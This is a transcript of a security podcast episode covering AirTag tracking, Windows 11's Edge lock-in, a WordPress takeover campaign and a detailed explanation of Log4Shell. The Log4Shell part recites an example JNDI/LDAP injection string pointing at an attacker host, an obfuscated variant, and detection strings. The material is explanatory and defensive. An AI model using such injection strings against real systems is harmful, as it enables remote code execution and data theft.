Unfortunately, though it's still early days, Apple's offering has not gone over very well in Androidland.  I guess it's not surprising that there appears to be a strong anti-Apple bias over in Androidville.  Some of those who posted reviews are complaining that the app will only scan on demand and then not continuously in the background, while others are complaining that no one wants to have power-wasting Bluetooth running continuously.



Someone named Matthew Conto posted yesterday.  He said:  "Not very effective compared to existing AirTag warning tools.  Apple's app doesn't do background scans, and shows all AirTags nearby instead of only unknown AirTags.  The app also doesn't save previously found AirTag locations, nor does it let you save their serial numbers.  It's as if Apple saw the bare minimum they needed to do and managed to do less.  C'mon, Apple, do better."



LEO:  That's actually fairly accurate.



STEVE:  I know.



LEO:  And by the way, it won't find my AirTag, even though it's sitting right next to me.



STEVE:  And didn't you also have to wait, like five minutes or something for it...



LEO:  Yeah.  It's scanning, scanning.



STEVE:  Yeah.



LEO:  Yeah, this is useless.  This is completely useless.



STEVE:  Robert Messier, or Messier maybe, posted earlier today.  He said:  "Stupid is as stupid does.  Why would anyone want constant scanning running in the background, thus draining the battery?  That defies logic."  He's grumpy.  "There is no legitimate need for it.  Just manually scan your own stuff when you feel the need.  It is quite pathetic and sad" - like I said, he's grumpy.



LEO:  Don't you love comment sections?  Geez.



STEVE:  I do, I do, "to think that you have to constantly scan.  Get a grip, snowflakes."



LEO:  Holy cow.  Holy cow.



STEVE:  Yeah.  So mostly just a heads-up about the issue, which is real.  Apple has created some very effective and very affordable trackers.  I'm sure that when placed around the neck of the family dog or cat, or perhaps a senior citizen who insists upon asserting their independence  they bring significant peace of mind to their owners.  That same functionality, as with any technology, can also be used for a malign purpose.



And if you are in the Android ecosystem, doesn't look like Apple has quite cornered the market on AirTag tracking.  Literally, there's like a page of them, and they all look really much better than what Apple offered.  Again, I think they just - maybe Apple figured, well, we got - since it's our tech that's being abused, we have to step in with something official.  But, boy, they apparently could have done a lot better job.  Maybe they'll update it.



LEO:  It's hard to think of how you could do a Bluetooth tracker that didn't have these, inherently have these problems.  I think Apple's done as best they could.  And of course the problem with AirTags is not so much that they're any different than, say, Tile or the other tags, but just that Apple's network is so huge because there's so many iPhones.



STEVE:  Right.



LEO:  And so it is much more useful than any of these other ones and as a result can be misused.



STEVE:  But Leo, couldn't it work?



LEO:  Couldn't what work?



STEVE:  Their tracker.  I mean, apparently it doesn't even work.



LEO:  Well, that's another problem.  I don't know.  There's a lot of Android phones out there, you know, it's hard to make - I am not surprised.  But, yeah, it doesn't see this.  And I don't know why it wouldn't.



STEVE:  You're like, you pressed it against the screen and it didn't see it.



LEO:  Yeah, it still doesn't see it.



STEVE:  It's like, you know, shove it in the little port and see what happens.  I mean, come on.



LEO:  Yeah, I mean, Bluetooth's on.  I don't think it's that.  I don't know what it is.  I don't know what it is.  So, yeah, not that useful.  For all, I mean, to be honest, this AirTag could have been dead for years.  Well, I got it not that long ago.  But it could be dead for all I know.  I never use it.  I think this whole idea of Bluetooth trackers is maybe not that useful.



STEVE:  Yeah, I agree.  I do agree.  Now, if only everyone had not turned off Amazon Sidewalk, we would actually have...



LEO:  We'd have something.



STEVE:  ...a ubiquitous network.



LEO:  There's nothing to compete with Apple's iPhone network.  I mean, that's the thing, and that's their power, of course.



STEVE:  Yeah.



LEO:  You know, they're everywhere.



STEVE:  Yeah, yeah.  I'm going to take a sip of water here, Leo, while you tell our listeners why we're here.



LEO:  Well, please do.  Okay, my friend.



STEVE:  So Windows 11 versus your browser of choice.



LEO:  Oh, god.  The endless topic; what?



STEVE:  Oh, my god.  It turns out I was wrong to give Microsoft props for reversing themselves about Windows 11's insistence upon Edge.



LEO:  Oh, that's hysterical.



STEVE:  I saw a published UI dialog on an extremely reliable tech news site which clearly showed at the top, above all the granular options, a single one-click option in Windows 11 which appeared to be offering a single-click browser switchover.  But then I listened to Paul Thurrott the next day during Windows Weekly, laboriously slogging through the description of what all still needs to be done.



My problem, which I've not yet solved, and I guess I'm going to have to, is that I don't have a single Windows 11 machine upon which to test things.  Paul does.  Otherwise I could be sure of what I was saying.  Nothing I have will run Windows 11, which, given everything we've seen of Windows 11, is just fine with me.  I'm driving an 18-year-old car, Leo, which I absolutely love.  Low mileage.  It's in perfect condition.  It was beautiful then, and it's beautiful now.  They don't make them like they used to.  I could buy a new car if I wanted one.  I don't want one.  I like the one I have.  Now, the crank I use to start the engine, okay, I agree, that's a little retro, and it can be annoying in the rain.  But it has a really nice place for me to set down my Palm Pilot.



So just to correct the record, latest information I've managed to track down indicates that with Windows 11 it will not be possible to completely switch away from Edge.  It's possible to mostly switch away by manually and individually changing the browser associations for HTTP, HTTPS, HTML, PDF, WebP, SHTML, FTP, HTM, Mailto, News and any others that you are able to change.  And I did see a UI for that.  On the other hand, it was those things, those options, those granular what do you want to associate with each of these things was beneath that single-click switch button, so perhaps the entire thing was a fever dream.  I don't know. 



But the final gotcha is that that still leaves one thing unchanged.  Back in Windows 10, when Microsoft began promoting their first Edge browser, remember Edge Classic or whatever they call it, they invented their own Windows-centric protocol scheme.  Schemes, remember, are those protocol names to the left of the separating colon.  So "http:" is a scheme, as is "https:."  Starting with Windows 10, Microsoft invented "microsoft-edge://" as a scheme, and not surprisingly they associated it with their Edge browser.



LEO:  It's a good word for that, a "scheme."



STEVE:  Yes, it's a scheme.



LEO:  Yeah, a scheme.



STEVE:  Those schemers.  It's that association with some third-party tools such as "EdgeDeflector" or "Search Deflector" that those apps were created to change, that is, to fight this microsoft-edge scheme.  And contrary to what I believed and said last week, between Windows Insider Preview builds 22483 and 22494, Microsoft decided to up the ante in this battle and neuter any attempt to change the association of their own microsoft-edge:// scheme away from Edge.  You can't do it any longer.  Consequently, apps like EdgeDeflector will no longer work for that scheme, and EdgeDeflector's developer has said he gives up.  He's throwing in the towel.  He's not going to escalate this battle any further.  He's apparently said that there were ways around it still, but it risked breaking Windows.  So no.



So this means that Microsoft's Widgets app in Windows 11 and perhaps a few other things, which are hard-coded to use the microsoft-edge protocol scheme exclusively, will always launch Edge, and that Edge may continue to use that opportunity to complain about no longer being the system's default web browser for everything else, too.  Oh, boo hoo.  Microsoft has clearly decided that this is a sword they're willing to fall on if it comes to that.  It's not as if Edge is bad.  I mean, it's Chromium-based; right?



As we've said, and has been noted, it's becoming laden with unwanted crapware and functionality that unfortunately keeps it from being as clean and pure as it originally was.  But I guess mostly it's just the loss of choice which is sad to see, the idea that a Windows user can no longer, as we have always been able to, choose the browser that we want to have open our various HTML things.  Oh well.  And as far as I know, that is correct.  Though I have not been able to test it myself.  As I said, I'm going to have to solve that problem here.



Okay.  WordPress once again in the crosshairs.  We haven't talked about WordPress for, like, since earlier this year when it was, like, weekly.  But now 1.6 million WordPress sites are under active attack from more than 16,000 IP addresses, in a protracted attempt to exploit multiple known weaknesses which exist in four plugins and 15 themes, all part of the Epsilon Framework.  WordFence, the company that specializes in offering add-on WordPress security, said last Thursday that it had detected and blocked more than 13.7 million attacks aimed at those four plugins, well, the four I'm about to name, and 15 themes over a period of just a day and a half; and that the attacks had the goal of taking over the websites and carrying out malicious actions.



Okay.  So the four plugins that are being attacked, there's the Kiwi Social Share plugin.  WordPress Automatic, yikes.  If yours is not up to date, I mean, that's very prevalent.  The Pinterest Automatic plugin and PublishPress Capabilities.  So those four plugins are under attack on specific version numbers less than the versions which fixed the vulnerability being attacked.  I've got them in the show notes for anyone who's interested.  But anyway, if you are managing any WordPress sites using Kiwi Social Share, WordPress or Pinterest Automatic, or PublishPress Capabilities, absolutely make sure that you are up to date.  And as we'll see, you need to take a look at what your authorized visitor list looks like.  I'll get to that in a second.



The 15 vulnerable Epsilon Framework themes, just in case any of them will ring a bell for any of our listeners, are Activello, Affluent, Allegiant, Antreas, Bonkers, Brilliance, Illdy, MedZone Lite, NatureMag Lite, NewsMag, Newspaper X, Pixova Lite, Regina Lite, Shapely, and Transcend.  So there's 15 of those, all associated with specific version numbers.  If that plugin is not up to date, it's likely under attack.



Okay.  So when we talk about 16,000 somethings, IPs, those are real, unlike in the case, for example, of UDP flooding, because these are unspoofable.  They're unspoofable because they have to be TCP connections in order to perform these attacks.  So it's clear that if you're talking 16,000, like more than 16,000, that's a botnet which has been engaged for this purpose.  The attacks observed by Wordfence involve the adversary updating the "users_can_register" option in WordPress to allow anyone to register, and setting the "default_role" to administrator.  These two changes allow any successful adversary to register on the vulnerable site and automatically be assigned admin privileges.  And at that point, of course, they're in control.



Now, thinking about this for a minute, what I want to know, Leo, is how - think about it - how it could possibly be that WordPress even offers the option anywhere for default role to be set to administrator?  How can it possibly be useful to allow anybody who signs up and creates an account to be given admin privileges?  That should not be an option in WordPress.  But it's there, and these guys turn it on, and then they can do what they want to.  So anyway, if anybody has any of those plugins or themes, be advised that there is a very aggressive campaign underway to get into your site.



Oh, and as I said, now you can see why, if you have those, and you're worried, take a look at the admin users that are listed for WordPress on your site and see if there are any you don't know because that would be a giveaway that somebody is in there.  And of course we know that once they're in, and they've been able to modify any files they want to, WordPress is just a massive PHP.  So good luck finding something that has been changed in there.  You really just have to expunge the works and back up your data, reinstall the site from scratch, and then restore only the content and not all the glue that holds it together.



Apropos of today's topic, TomTen tweeted publicly, so I felt that it was okay for me to retweet this, he said:  "Our company is in a panic trying to get a lock on all the places where Log4j is used.  Seems like it sneaks into everywhere."  And we'll be talking about that of course at length.



Two quick little sci-fi notes.  We just finished, Leo, the third season of Netflix's "Lost in Space."



LEO:  You have more stamina than I do.



STEVE:  I know.



LEO:  I don't think I got to the first season.



STEVE:  It really is a kids' series, as it always was.



LEO:  Yeah, yeah.  It was nicely done.  I thought they did a good job.  But...



STEVE:  I thought they did a great job, actually.



LEO:  Yeah, yeah.



STEVE:  But the way they ended it, you know, they kind of left it open-ended.



LEO:  Are they still lost?



STEVE:  No, but they sort of left it open so that they could do something more if they wanted to in the future.  But eh.



On the other hand, the very adult sci-fi series "The Expanse" has started its sixth and final season.  It's rolling them out weekly.  Since I can no longer believe that we all used to wait a week between episodes, that's just like, you know, no wonder you need a recap at the beginning in order to remind you where you were the week before.  Anyway, we plan to wait until the whole series has wrapped up, and then we'll watch the final season over several nights rather than several months.



Oh, and in good news, Leo, you keep talking about "Succession."  Lorrie has indicated that she'd be willing to watch it, even though the people are despicable.



LEO:  That's the whole point.  Tell her - this will get her.  It's Shakespeare.  It's like King Lear.  Everybody is awful.  They're all trying to kill each other.  It's a constant battle for power.  And by the way, it just completed Season 3 on Sunday.  Mindboggling.  Now, this is my personal opinion.  Lisa does not think - I think it's my favorite show of all time.  Lisa says, "It's fine."  So, you know, it's just my personal favorite.



STEVE:  More than "Breaking Bad" that was previously...



LEO:  Yeah.  Yeah.  More than "The Sopranos."  More than "Breaking Bad."



STEVE:  "Better Call Saul" ended up being really good, too.



LEO:  It's very good.  I love "Better Call Saul."  No, there's something about "Succession," or maybe it's just me, but it just rings my chimes.



STEVE:  Sort of like Schadenfreude on steroids.



LEO:  Well, they're terrible people.  But they're all damaged in their own unique and hysterical ways.



STEVE:  Wow.



LEO:  Yeah.



STEVE:  Well, I look forward to it.



LEO:  It's kept its - I think it's kept its quality for three seasons.  Which is not...



STEVE:  And there will be a fourth?



LEO:  There will be a fourth, yes.  Now, I'm hoping they stop after four.  I've yet to see a show that makes it past four seasons with the same quality.



STEVE:  Yeah, even "Game of Thrones" sort of dragged for a while.



LEO:  Yeah, yeah.



STEVE:  It was like, what happened to...



LEO:  And then Season 8 was like [disparaging noise].  So, yeah.



STEVE:  Okay.  The new intrinsic debugger that I described last week that I would be building into SpinRite after last week's podcast is in place, and it quickly allowed us to determine that the problems we're seeing do not appear to be in my code.  They're apparently being caused by specific hardware, and only in specific cases.  But I won't know that for sure until those oddball problems are resolved.



All of the new SpinRite code written so far appears to be working perfectly for the majority of its testers who don't have any of a small number of machines which are causing trouble.  I think we have, like, four, maybe five mysteries at the moment.  And the number of such machines continues to drop.  So we're like in that classic 95/5 phase where a lot of the work is going into a very few cases.  On the other hand, I need to know because I need to make sure that it's not my code.  Or I need to come up with some solid workarounds to deal with these because other people will have these problems, too. 



Since I'm currently able to occupy myself full time working to resolve these remaining issues, that's where my focus will remain until either every known problem is resolved, or I run out of things to try.  Most of the machines, I think actually all of the machines having trouble are very old, but they're still in service.  So I've purchased instances of the offending hardware from eBay, and a bunch of it is currently en route to me.  Recreating the problem here is always the best way to get something fixed quickly, and not to just endlessly tax my very patient SpinRite testers with like, okay, try this.  Okay, try this.  Okay, try this.  Okay, try this.  And adding to my own SpinRite test machine inventory is always money well spent.



The problem that I'm seeing is that the threaded discussion posting mode of GRC's text-only newsgroup, while fabulous for maximum speed group sharing and feedback on new releases, that lets me move forward so quickly.  But it doesn't really work as well for managing persistent problems that only one or two people are experiencing, and only on specific hardware.  Nobody else is able to recreate these problems.  So as a consequence, things tend to get spread around, and it's possible for things to fall through the cracks.



The best way to handle that is with a static knowledgebase of known problems.  So I'm hoping that adding GitLab to our development community might provide the missing piece.  After today's podcast, I plan to spin up an instance of GitLab on a GRC server.  I have a spare FreeBSD Unix box which I used a couple of years ago as my staging machine for the migration of all of our stuff on the existing old FreeBSD machine over to where we are now.  So I plan to use that and host GitLab there and see if it does the job for us.



So anyway, work is moving apace.  It is looking like the estimates that the benchmark is currently producing were probably pessimistic in its estimate of the amount of time that SpinRite would require to process a drive.  We won't know until we actually have some full-drives being processed, and we can compare to the estimate.  And then I'll adjust that accordingly.  But anyway, I am very happy with its performance.  And I'm really happy with the very few number of problems we're seeing.



For example, there's a particular ASUS motherboard and laptop, both of the same generation, both using AMD, both causing an overwrite of SpinRite's code, but SpinRite's not doing it.  So it must be something about the fact that SpinRite is using DMA, and an aberrant DMA transfer is causing an overwrite.  If I use low memory buffers, there's no problem.  It's only when the buffers are moved up into high memory, like above the 1MB point, that there's like an overwrite down below.  So it's like maybe some high bits of addressing are being lost.



Anyway, it's both of these different people with different machines, but they're both ASUS, and they're both AMD, and they're both the same chipset, are seeing exactly the same problem.  I mean, exactly.  So, you know, it's something weird.  Anyway, I found one of the motherboards on eBay for 99 bucks, and I'll get it later this week and be able to recreate, hopefully recreate the problem.  Oh, oh, I forgot to mention it only also happens for one person with a 200GB Maxtor IDE.  Not 120GB or 80GB.  So it's like, what?  Anyway, I can't wait to find out what's going on.



LEO:  It's interesting, huh.



STEVE:  Yeah, it is.  And it's because I've been dogged about these things that I end up with something which really does work reliably.  And I'm of course willing to wrestle this thing to the ground. 



LEO:  Bravo.



STEVE:  So I will probably next week be able to say, guess what it was?



LEO:  Let's talk about Log4Shell.



STEVE:  So I got a big kick out of our listeners' tweets this morning because they all connected when they were seeing some of this with exactly what the first thing was that occurred to me, which is that we've seen a lot of very bad vulnerabilities with CVSS scores of 9.8.  But of course that's out of a maximum of 10.  And I've often wondered on this podcast aloud what a CVSS score of 10 might look like.



LEO:  Do we know now?



STEVE:  We need wonder no longer.



LEO:  Oh, lord.



STEVE:  Yes.  CVE-2021-44228, which has been assigned to track the vulnerability known as "Log4Shell," has earned itself the maximum possible CVSS score of 10.0.  They don't come any worse than this.  And it occurred to me this is the only instance in which Bruce Schneier's oft-quoted pithy observation that "vulnerabilities only ever get worse, they never get better" doesn't apply because this one cannot possibly get any worse.  It is the worst it can get.



Okay.  So first a bit of nomenclature.  "Log4j" is a very widely used, as in many, many millions, if you could even count them, of installations, as the one tweeter who I quoted said, you know, their company is on pins and needles trying to find all the instances of it within their organization because it's everywhere.  It's an open source server-logging JAVA framework.  Its job is to log things that happen on a JAVA server, like the contents of form submissions or HTTP query metadata details and such.



These days, with storage being so inexpensive, logs tend to be kept of all sorts of activities.  Like what's the first thing that any security guy does when a problem comes up?  Like when they're suspicious of something?  You look at your logs to determine what happened in the past.  So consequently, many sites just log everything in case it might be useful after the fact.  And it often is.  But now just imagine how bad it would be if what is supposed to be a passive logging tool wasn't passive after all, but instead would actively interpret, and there's that word, "interpret," the content that it was logging, and that content comes from the outside.  This would allow a site's visitors to talk to it, as well as unknown remote miscreants, simply by providing something, anything, that gets logged.



So how widespread is this?  Log4j is included with almost all the enterprise products released by the Apache Software Foundation:  Apache Struts, Flink, Druid, Flume, Solr, Kafka, Dubbo, whatever that is, and probably many more.



LEO:  These names, wow.



STEVE:  Yeah.  Open-source projects like Redis, the big caching server.



LEO:  Redis Server, we use that, yeah.



STEVE:  Redis, ElasticSearch, Elastic Logstash, the NSA's Ghidra that we've talked about, and countless other things use Log4j in some capacity.  And all of the companies that use any of these products are indirectly vulnerable to the Log4Shell exploit, even if some may not be aware of it because Log4j is buried deeply within their infrastructure.  According to research published last Thursday, companies with servers confirmed to be vulnerable to Log4Shell attacks include Apple, Amazon, Twitter, Cloudflare, Steam, Tencent, Baidu, DIDI, JD, NetEase, and no doubt thousands more.



Sunday, the Canadian news outlet The Globe and Mail explained, and I heard you mention this on MacBreak Weekly, Leo, explained why Canadian government websites had all suddenly gone dark.  They wrote:  "Amid warnings from Ottawa of a global online security issue, Quebec said Sunday that it has shut down almost 4,000 government websites as a preventative measure after receiving a cyberattack threat."



At a news conference, Quebec's Minister of Digital Transformation said the province was made aware of the threat on Friday and has since been working to identify which websites are at risk, one by one, before putting them back online.  "We're kind of looking for a needle in a haystack," Eric Caire said, in Quebec City.  "Not knowing which websites use the affected software, we decided to shut them all."  So, I mean, you know...



LEO:  Well, sure.



STEVE:  Who can blame them these days?  Like I said, this is not  your grandmother's cyberthreat; right?  I mean, this is not a decade ago, even though it may be the worst thing that's happened in a decade.  Everybody's on edge now with all this ransomware stuff happening.



He added:  "Once we make sure the system is operational, it gets back online."  Mr. Caire said the provincial vaccine passport system was never at risk, saying it doesn't require the software that has been the focus of attention.  Canada Revenue Agency goes offline as a precaution, citing a global vulnerability.  Defense Minister Anita Anand said the federal government is aware of a vulnerability in a software product called Apache.  Okay, well...



LEO:  She's very aware.  That's good for her.



STEVE:  She's not quite tuned into the deal.



LEO:  M'kay.



STEVE:  But she says, "which has the potential 'to be used by bad actors in limited and targeted attacks.'"  Right.  Ms. Anand said in a statement Sunday that the Canadian Centre for Cyber Security is calling on Canadian organizations of all types to pay attention to this "critical Internet vulnerability affecting organizations across the globe."



Okay.  So this might seem like something of an overreaction.  But the more we learn the less it appears so.  I mean, really, I can understand.  Just pull the plug and get your tech guys in there to figure out if there's a problem.



Okay.  The first instance of this coming to light was when the massive Chinese tech firm Alibaba privately reported the vulnerability to the Apache Foundation, which are the ones who maintain the Log4j module.  Naturally, logging is an important feature of Apache.  In fact, as I mentioned I think maybe before the show or maybe at the top of the show, Apache has an entire logging subdomain at https://logging.apache.org.  And sure enough, right at the top on the left, the first thing that it shows you is Log4j as one of their logging options.



The publication The Record reported that the flaw was originally discovered during a bug bounty engagement against Minecraft servers.  So someone was enterprising.  They were looking for  some way to exploit Minecraft servers.  And of course Minecraft is Java.  So this is what they've come up.  This was the first obvious signs of the flaw's exploitation at that point.  Adam Meyers, CrowdStrike's Senior VP of Intelligence, and our friend @MalwareTechBlog's Marcus Hutchins independently observed that frisky Minecraft users were using it to execute programs on the computers of other users, simply by pasting a short message into a chat box.  Yes, it's truly that easy to exploit, which as much as anything explains its CVSS rating of 10.



Apple's cloud services were compromised - not could be, were - simply by changing the name of an iPhone, Leo.



LEO:  Wow.



STEVE:  In the show notes here is a screen shot made by someone who did this.  He changed his name to a string, which I'll be talking about in a minute, then looked at the log of some DNS servers that he induced Apple's iCloud infrastructure to query as a consequence of just setting the name on his iPhone to a string that would perform the exploit.  The iCloud backend was exploited, produced DNS queries, which were captured.  The second screen shot here on the next page shows at dnslog.cn, obviously a Chinese DNS server, incoming queries from two IPs, 17.123.16.44 and 17.140.110.15.  And then ARIN's registration record for one of the IPs showing it registered to Apple Inc. at 20400 Stevens Creek Blvd., City Center Bldg. 3, Cupertino, blah blah blah.



LEO:  So this proves that Apple IP addresses, presumably their servers, logged into this Chinese logging site on the behest of the hacker.



STEVE:  Correct.



LEO:  Wow.



STEVE:  Correct.



LEO:  Yikes.  That's pretty good proof there, right there.



STEVE:  And the same was possible by changing the name of Tesla automobiles.



LEO:  Yikes.  Holy cow.  Now, this was benign because it just said hello.  But it could execute remote code?



STEVE:  Yes.  As we will see here in a second.



LEO:  Jesus.



STEVE:  So these were safe tests being performed by people who did not want to exploit Apple, but absolutely 100% vulnerable to remote code execution.  I mean, it is this bad.  It's unbelievable.  Okay.  So over on the Apache page for describing their logging services at logging.apache.org/log4j/2.x.  Oh, and by the way, every time I say Log4j I really mean Log4j 2 because the 2 is the major version number.  But it's been around forever, so it's sort of assumed.  Anyway, they talk about there what has happened.  They said, in a little bit of an egg-on-their-face mode, the Log4j team has been made aware - I bet - of a security vulnerability, CVE-2021-44228 that has been addressed in Log4j 2.15.0.  In other words, that's the fixed one.



They said:  "Log4j's JNDI support, that's the Java Naming and Directory Interface, has not restricted what names could be resolved.  Some protocols are unsafe or can allow remote code execution.  Log4j now limits the protocols by default to only Java, LDAP, and LDAPS, and limits the LDAP protocols to only accessing Java primitive objects by default served on the local host."  In other words, the lack of those remediations which 2.15 just received is the crux of the problem.  But I'll get into it in more detail in a second.



They said:  "One vector that allowed exposure to this vulnerability was Log4j's allowance of Lookups to appear in log messages."  Again.  "One vector that allowed exposure to this vulnerability was Log4j's allowance of Lookups to appear in log messages.  As of Log4j 2.15.0, this feature is now disabled by default."  But it wasn't before.  "While an option has been provided to enable Lookups in this fashion, users are strongly discouraged from enabling it.  For those who cannot upgrade," blah blah blah.  They talk about some remediation stuff.  Okay.  For what it's worth, some stop-gap remediation measures do exist.  Just upgrade.  Update.  Because bad guys are going to find ways around them.



Microsoft, who owns Minecraft, posted a nice and complete summary of the situation over the past weekend.  Microsoft said:  "Microsoft have been tracking threats taking advantage of CVE-2021-44228, a remote code execution vulnerability in Apache Log4j 2 referred to as 'Log4Shell.'  The vulnerability allows unauthenticated remote code execution and is triggered when a specially crafted string provided by the attacker through a variety of different input vectors is parsed and processed by the Log4j 2 vulnerable component."



And I'll stop here just to remind people, up until this point what I just read could apply - what Microsoft wrote and I read - could apply to instances where there has been a mistake made; right?  Where there's, like, a parsing error, a buffer overflow, a this or a that or a something or other, right, that was wrong, that was broken, that was not on purpose.  That's not the case here, which is what is so shocking.  Like everything that is being done was by design.  It was on purpose.  It's not a bug, it's a feature.  Although it's one that you could just see Apache has now quickly disabled because whoops.  "For more information," they wrote, "and mitigation information about the vulnerability, please read the Microsoft Security Response Center blog."



They said:  "The bulk of attacks that Microsoft has observed at this time have been related to mass scanning by attackers attempting to thumbprint vulnerable systems" - right, they're building their inventory - "as well as scanning by security companies and researchers" - right, who are curious.  "An example pattern of attack would appear in a web request log with strings like the following."  So now they have ${jndi:ldap://, so that's a scheme, right, JNDI is this Java name resolution,  LDAP is an Internet protocol scheme, //, and then the attacker IP /a, and then close the curly brace.



"An attacker performs an HTTP request against a target system, which generates a log using Log4j 2 that leverages JNDI to perform a request to the attacker-controlled site."  So that string I read - dollar sign, open curly, the stuff in the middle, then closed curly - that's what you put into an HTTP header, into a chat box, into a form, into anything that that server will log.  Because it goes through this Log4j, Log4j in its previous default configuration would see the dollar sign, open curly brace, jndi colon, and go, ah, here's something for me to expand, to process on the fly.  It will then make an LDAP query to the domain name or IP address provided and download Java code and run it.  I mean, just, like, wow.



Microsoft said:  "The vulnerability then causes the exploited process to reach out to the site and execute the payload.  In many observed attacks, the attacker-owned parameter is a DNS logging system intended to log a request to the site to fingerprint the vulnerable systems."  That's what the security  researchers are doing.  They're not obviously loading code.  They'd get in trouble if they did that.  But they are causing the attack sites, since it's ldap:// and the domain name, if they put a domain name in, the site which needs to reach out to fulfill the LDAP query gets the IP of the domain name.



So by monitoring incoming DNS requests, they're able to collect all the sites that are vulnerable because they want to execute that payload.  But they need the IP address first.  So, and you can of course by not replying to the DNS query, you can prevent that from going any further while at the same time fingerprinting the fact that, if given the chance, that site would have done so.



Microsoft said:  "The specially crafted string that enables execution of this vulnerability can be identified through several components.  The string contains 'jndi,' which refers to the Java Naming and Directory Interface.  Following this, the protocol, such as 'ldap,' 'ldaps,' 'rmi,' 'dns,' 'iiop,' or 'http,' precedes the attacker domain.  As security teams work to detect the exploitation of the vulnerability, attackers not surprisingly have added obfuscation to these requests to evade" - and I'll put in my own comment simple-minded detection - "to evade detections based on request patterns."



Microsoft wrote:  "We've seen things like running a lower or upper Java command within the exploitation string."  So, for example, {jndi:, and instead of saying just ldap, they'll do ${lower:l}${lower:d, right, in order to like break up the simple text pattern so that simple string matching will not be able to see ldap there.  And they said:  "...and even more complicated obfuscation attempts," and then there's another example of, like, crazy stuff that are all trying to bypass string-matching detections.



"At the time of the publication," they said, "the vast majority of observed activity has been scanning, but exploitation and post-exploitation activities have also been observed."  And that's absolutely the case.  I didn't go into it because there's just, it's like, just there's too much.  I wouldn't even know what to talk about.  There's just so much happening right now.



They said:  "Based on the nature of the vulnerability, once the attacker has full access and control of an application, they can perform a myriad of objectives.  Microsoft has observed activities including installing coin mining, Cobalt Strike beacons" - which we talked about a couple weeks ago - "to enable credential theft and lateral movement, and exfiltrating data from compromised systems."  It is a free-for-all right now.



On Saturday, December 11th, Cloudflare's CEO Matthew Prince tweeted:  "Earliest evidence we've found so far of Log4j exploit is 2021-12-01," and then a time UTC.  He says:  "That suggests it was in the wild at least nine days before being publicly disclosed.  However, we don't see evidence of mass exploitation until after public disclosure."  Right?  So it was being used selectively until everyone knew about it.  Then it was, woohoo, get in there before they patch.



And on Sunday, day before yesterday, Marcus Hutchins tweeted:  "Kryptos Logic's Log4j scanner discovered more than 10,000 vulnerable hosts using simple HTTP header probing."  He tweeted on the 12th, two days ago.



Wikipedia has some additional information, first telling us a bit more about the underlying Log4j framework.  Wikipedia said:  "Log4j is an open source logging framework that allows software developers to log various data within their application.  This data can also include user input.  It is used ubiquitously in Java applications, especially enterprise software.  Originally written in 2001, it is now part of Apache Logging Services, a project of the Apache Software Foundation.



"The Java Naming and Directory Interface (JNDI) allows for lookup of Java objects at program runtime, given a path to their data.  JNDI can leverage several directory interfaces, each providing a different scheme of looking up files.  Among these interfaces is the Lightweight Directory Access Protocol (LDAP), a non-Java-specific protocol which retrieves the object data as a URL from an appropriate server, either local or"  wait for it  "anywhere on the Internet.



"In the default configuration" - and of course we all know about the tyranny of the default - "when logging a string, Log4j 2 performs string substitution on expressions of the form ${prefix:name}."  Hear that again.  In other words, it's interpreting.  "For example," they said, "text would be ${java:version} might be converted to Java version 1.7.0_67.  Among the recognized expressions is ${jndi: and then something to look up.  By specifying the lookup to be through LDAP, an arbitrary URL may be queried and loaded as Java object data."  What could possibly go wrong?



And they give an example using ldap://example.com/file, for example, "will load data from that URL if connected to the Internet.  By inputting a string that is logged, an attacker can load and execute malicious code hosted on a public URL.  Even if execution of the data is disabled, an attacker can still retrieve data such as secret environment variables by placing them in the URL, in which they will be substituted and sent to the attacker's server."



So I'll just note that the worst offending problems, such as this 10.0 nightmare we're facing today, tend to be those that are by design rather than by mistake.  The example that comes to mind was the huge amount of heat I took many years ago for noting that Microsoft had clearly, by design, given their original WMF  Windows Metafile Format  the ability to include native executable code within the file itself.  Metafiles are interpreted, and there was an escape code which simply caused the interpreter to jump to code inside the file itself.



At the time this was done, back when Windows 1.0 was being called a "DOS runtime," and nothing was connected to anything else, this was a perfectly reasonable thing to do.  And it was kind of cool if some function was needed that the metafile interpreter could not perform.  But many years later, when this was rediscovered in the Windows metafile interpreter, no one could imagine that it could have ever been deliberate.  But times were much different back then.  My point is, it's very clear that this instance of this Log4j mess was not a bug, it was a feature.  Badly conceived, certainly.  Never intended to happen this way, of course.  But it was there.



Anyway, Wikipedia finishes this discussion by explaining:  "Because HTTP requests are frequently logged, a common attack vector is placing the malicious string in the HTTP request URL or a commonly logged HTTP header, such as User-Agent.  Early mitigations included blocking any requests containing potentially malicious contents, such as '${jndi.'  But naive searches can be circumvented by obfuscating the request."  And they give an example like Microsoft's.  "Even if an input is not immediately logged, such as a first name, it may be later logged during internal processing and its contents executed then."  And all of those notes and observations in Wikipedia have references to their original sources, for anyone who's interested.



Okay.  So Huntress Labs has produced and is offering a free and open source Log4Shell vulnerability testing page.  It is at https://log4shell.huntress.com.  The open source is posted on GitHub.  And I set that up as the shortcut of the week for us.  So you can easily get to it anytime by using this episode number, 849:  grc.sc/849.  The page that comes up will explain.



It says:  "This site can help you test whether your applications are vulnerable to Log4Shell.  Here's how to use it," they said.  "You simply copy and paste the generated JNDI syntax."  The code block is down below on the page, and it will be customized.  Every single time you go to the page you get a different one.  So it's generating a big globally unique ID on the fly.  You paste that string they give you into anything - application input boxes, frontend site form fields, logins such as username inputs or passwords; or if you get bit more technical, even User-Agent or X-Forwarded-For or other customizable HTTP headers.



Then check the results page, which they provide a link to, to see if it received any connection, and verify the detected IP address and timestamp to correlate with when you tested any service.  In other words, they're offering this benign query service that other security professionals are themselves using to anyone who wants to make a test.  And they said, if you see an entry, a connection was made and the application you tested is vulnerable. 



And then they said of this:  "The following payload should only be used with systems which you have explicit permission to test.  If you find any vulnerable applications or libraries, you should exercise responsible disclosure to minimize any potential fallout due to the vulnerability."  In other words, hint, hint, anybody can test anybody's system with this.  That is, it's not just you testing your own stuff.  That's the official use for it.  And be advised that your IP as a remote tester of this would probably be logged also.  So don't do this cavalierly.  You don't want to get yourself in trouble.  But it is extremely useful if you want to perform a quick test of your own stuff.  These are good guys.  They're well known.  They're an authentic security firm.



Under technical details they said:  "The tool works by generating a random unique identifier which you can use when testing input fields.  If an input field or application is vulnerable, it will reach out to this website over LDAP.  Our LDAP server will immediately terminate the connection, and log it for a short time.  This tool will not actually run any code on your systems."  So anyway, again, grc.sc/849 just bounces you to this Huntress Labs free Log4Shell testing page.  And I think it looks very useful.



LEO:  I just want to show briefly the same thing using a Canary token, which is kind of a cool way to do it.  It's from Eclectic Light Company.  Let me see if I can...



STEVE:  Oh, cool.



